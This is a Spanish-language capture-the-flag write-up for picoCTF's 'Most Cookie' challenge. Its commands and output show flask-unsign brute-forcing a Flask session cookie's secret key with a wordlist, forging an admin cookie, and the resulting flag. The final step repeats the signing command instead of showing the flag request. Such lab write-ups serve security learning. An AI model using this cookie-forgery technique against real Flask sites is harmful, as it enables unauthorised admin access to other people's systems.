### Most Cookie

### DESCRIPCIÓN

Alright, enough of using my own encryption. Flask session cookies should be plenty secure! http://wily-courier.picoctf.net:57247/
### SOLUCIÓN
 

- Instalar flask-unsign

```
┌──(kali㉿kali)-[~/Desktop]
└─$ sudo apt install pipx

┌──(kali㉿kali)-[~/Desktop]
└─$ pipx install flask-unsign

┌──(kali㉿kali)-[~/Desktop]
└─$ sudo gzip -d /usr/share/wordlists/rockyou.txt.gz

```

- Crakeamos la cookie de flask usando una lista de palabras

```
┌──(kali㉿kali)-[~/Desktop]
└─$ flask-unsign --unsign \
--cookie "eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.aatdFg.7Avc9akhqYGqN6API71bv9B8xvE" \
--wordlist /usr/share/wordlists/rockyou.txt \
--no-literal-eval
[*] Session decodes to: {'very_auth': 'blank'}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 1587712 attemptsg22xerzmaaaa
b'lebkuchen'



```

- Crear y firmar la cooki de admin:

```
┌──(kali㉿kali)-[~/Desktop]
└─$ flask-unsign --sign \
--cookie "{'very_auth':'admin'}" \
--secret lebkuchen
eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.aathAA.NLcVBebSeM6sDrYXRbQiM31rttg

```

- Usar la cookie crakeada para obtener la bander
```
┌──(kali㉿kali)-[~/Desktop]
└─$ flask-unsign --sign \
--cookie "{'very_auth':'admin'}" \
--secret lebkuchen
eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.aathAA.NLcVBebSeM6sDrYXRbQiM31rttg

```

`picoCTF{cO0ki3s_yum_f3526545}`
### NOTAS ADICIONALES


### REFERENCIAS